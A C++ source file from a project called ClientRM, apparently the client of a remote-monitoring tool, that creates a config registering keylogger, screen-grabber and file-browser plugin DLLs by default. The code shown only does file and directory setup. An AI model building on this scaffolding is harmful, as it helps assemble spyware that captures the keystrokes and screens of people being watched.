
// ** ClientRM project **
// InitThread.cpp : Function to initialize the CPM

#include "ClientInclude.h"

DWORD WINAPI InitThread(LPVOID lpParam) {
    extern CLIENTCONF g_ClientConf;
    extern WCHAR g_wszCWD[];

    int iRetVal;
    int ErrorCode;
    int	iConfigFile = 0;

    HWND hOwnerWnd = (HWND)lpParam;
    BOOL ErrorFlag = FALSE;

    CLIENTCONF ClientConf = { 0 };

    // check whether config file exists
    if ((iRetVal = _wsopen_s(&iConfigFile, FP_HOST_CONF, _O_RDONLY | _O_BINARY, _SH_DENYWR, _S_IREAD | _S_IWRITE)) != 0) {
        if (iRetVal == ERROR_FILE_NOT_FOUND) {
            // create the file
            if ((iRetVal = _wsopen_s(&iConfigFile, FP_HOST_CONF, _O_WRONLY | _O_CREAT | _O_TRUNC | _O_BINARY,
                _SH_DENYRW, _S_IREAD | _S_IWRITE)) != 0) {
                // cannot create the file
                ErrorFlag = TRUE;
                ErrorCode = E_FILE_CREATION;
                SendMessage(hOwnerWnd, WN_INIT_DONE, ErrorCode, ErrorFlag);
                return FALSE;
            }

            // fill the config stucture
            ClientConf.nPlugins = 3;
            ClientConf.PluginInfo[0].iPluginID = KEYLOGGER;
            wcscpy_s(ClientConf.PluginInfo[0].wszPath, MAX_PATH + 1, L"");
            wcscpy_s(ClientConf.PluginInfo[0].wszName, MAX_FILE_NAME + 1, L"KeyLogger");
            wcscpy_s(ClientConf.PluginInfo[0].wszDLLInterfaceName, MAX_FILE_NAME + 1, L"KeyLogIF.dll");

            ClientConf.PluginInfo[1].iPluginID = SCREENGRABBER;
            wcscpy_s(ClientConf.PluginInfo[1].wszPath, MAX_PATH + 1, L"");
            wcscpy_s(ClientConf.PluginInfo[1].wszName, MAX_FILE_NAME + 1, L"ScreenGrabber");
            wcscpy_s(ClientConf.PluginInfo[1].wszDLLInterfaceName, MAX_FILE_NAME + 1, L"ImgGrbIt.dll");

            ClientConf.PluginInfo[2].iPluginID = FILEBROWSER;
            wcscpy_s(ClientConf.PluginInfo[2].wszPath, MAX_PATH + 1, L"");
            wcscpy_s(ClientConf.PluginInfo[2].wszName, MAX_FILE_NAME + 1, L"FileBrowser");
            wcscpy_s(ClientConf.PluginInfo[2].wszDLLInterfaceName, MAX_FILE_NAME + 1, L"FBrowzRM.dll");

            // write the structure to config file
            if (_write(iConfigFile, &ClientConf, sizeof(CLIENTCONF)) == -1) {
                _close(iConfigFile);
                iConfigFile = 0;
                ErrorFlag = TRUE;
                ErrorCode = E_FILE_CREATION;
                SendMessage(hOwnerWnd, WN_INIT_DONE, ErrorCode, ErrorFlag);
                return FALSE;
            }
            _close(iConfigFile);
            iConfigFile = 0;

            // copy the config to the global variable
            memcpy(&g_ClientConf, &ClientConf, sizeof(CLIENTCONF));
        } else {
            // unknown error
        }
    }// _wsopen_s()
    // file found, read the contents into global variable g_ClientConf
    else if ((iRetVal = _read(iConfigFile, &g_ClientConf, sizeof(CLIENTCONF))) < 0) {
        _close(iConfigFile);
        iConfigFile = 0;
        ErrorFlag = TRUE;
        ErrorCode = E_FILE_READ;
        SendMessage(hOwnerWnd, WN_INIT_DONE, ErrorCode, ErrorFlag);
        return FALSE;
    }

    if (iConfigFile != 0) {
        _close(iConfigFile);
        iConfigFile = 0;
    }

    // create directories
    // Plugins directory
    if ((iRetVal = CreateDirectory(FP_PLUGINS_DIR, NULL)) == ERROR_PATH_NOT_FOUND) {
        ErrorFlag = TRUE;
        ErrorCode = E_CREATE_DIR;
        SendMessage(hOwnerWnd, WN_INIT_DONE, ErrorCode, ErrorFlag);
        return FALSE;
    }

    // Temp directory
    if ((iRetVal = CreateDirectory(FP_TEMP_DIR, NULL)) == ERROR_PATH_NOT_FOUND) {
        ErrorFlag = TRUE;
        ErrorCode = E_CREATE_DIR;
        SendMessage(hOwnerWnd, WN_INIT_DONE, ErrorCode, ErrorFlag);
        return FALSE;
    }

    // after initialization, send notification to main window
    SendMessage(hOwnerWnd, WN_INIT_DONE, 0, (LPARAM)ErrorFlag);

    return TRUE;

}